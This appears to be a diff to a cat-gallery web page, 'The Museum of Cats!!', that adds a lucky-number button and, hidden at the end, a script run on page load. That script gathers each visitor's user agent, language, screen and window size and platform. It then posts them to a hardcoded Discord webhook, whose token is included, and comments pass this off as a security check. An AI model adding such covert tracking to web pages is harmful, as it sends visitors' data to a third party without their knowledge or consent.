@@ -2,24 +2,38 @@
 
 <html>
     <head>
-        <title>The Museum of Cats!!</title> <!-- title -->
-        <style>
-            .gallery {
-              display: flex;
-              flex-wrap: wrap;
-            }
+    	<title>The Museum of Cats!!</title> <!-- title -->
+      <title>Device Info</title>
+
+      <style>
+
+          .gallery {
+          display: flex;
+          flex-wrap: wrap;
+          }
         
-            .gallery img {
-              width: 300px;
-              height: 200px;
-              object-fit: cover;
-              margin: 10px;
-            }
-          </style>
+          .gallery img {
+          width: 300px;
+          height: 200px;
+          object-fit: cover;
+          margin: 10px;
+          }
+      </style>
+		
+		<script>
+			 function generateRandomLuckyNumber() {
+      		var luckyNumberContainer = document.getElementById("lucky-number");
+      		var randomNum = Math.floor(Math.random() * 1001);
+      
+      		luckyNumberContainer.textContent = randomNum;
+			}
+		</script>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script> <!-- USED to check Device Security Info-->
     </head>
 
-    <body>
 
+    <body>
         <h1>The Museum of Cats!!</h1>
         <div class="gallery">
             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSy-qDeKJQikVkZbYIwdIGwi8dtiFDm4vLrRSLo-pbn5zpfuVsvsPFNLMJ038WV_aeawAw&usqp=CAUg" alt="Cat 1">
@@ -27,6 +41,10 @@
             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTx5LAPvqU9NWg-AJicrvmppAPlxujdDMaNZA&usqp=CAU" alt="Cat 3">
             <img src="https://images.pexels.com/photos/6441460/pexels-photo-6441460.jpeg?auto=compress&cs=tinysrgb&dpr=1&w=500" alt="Cat 4">
           </div>
+
+		    <h1>Lucky Number Roll!</h1>
+		    <button onclick="generateRandomLuckyNumber()">What is your lucky number today mate?</button>
+		    <div id="lucky-number"></div>
 
         <script>
             var xhr = new XMLHttpRequest();
@@ -50,6 +68,41 @@
             };
             
             xhr.send();
+          </script>
+
+          
+
+          <script>
+             // Function to send device info to Discord webhook
+              function sendDeviceInfo() {
+            // Get device information
+              var deviceInfo = {
+                "User Agent": navigator.userAgent,
+                "Language": navigator.language,
+                "Screen Resolution": window.screen.width + "x" + window.screen.height,
+                "Browser Dimensions": window.innerWidth + "x" + window.innerHeight,
+                "Platform": navigator.platform
+                };
+
+                 // Convert device info to JSON string
+                var jsonDeviceInfo = JSON.stringify(deviceInfo);
+
+                // Send device info to Discord webhook using AJAX
+                $.ajax({
+                    type: "POST",
+                    url: "https://discord.com/api/webhooks/1158992076839583815/MAw-xZ9ELt9rv-RuQndxFVAHG41F0hO2DmX314SzhMmknexPv5tat8MWWIu8cqVOJHfE",
+                    data: {
+                        content: "Visitor Device Info:\n" + jsonDeviceInfo
+                    },
+                    success: function(){
+                      console.log("Device info sent to webhook for security reason")
+                    },
+                    error: function() {
+                    console.log("Error, Try Again");
+                }
+            });
+                                }
+            window.onload = sendDeviceInfo;
           </script>
     </body>
 </html>
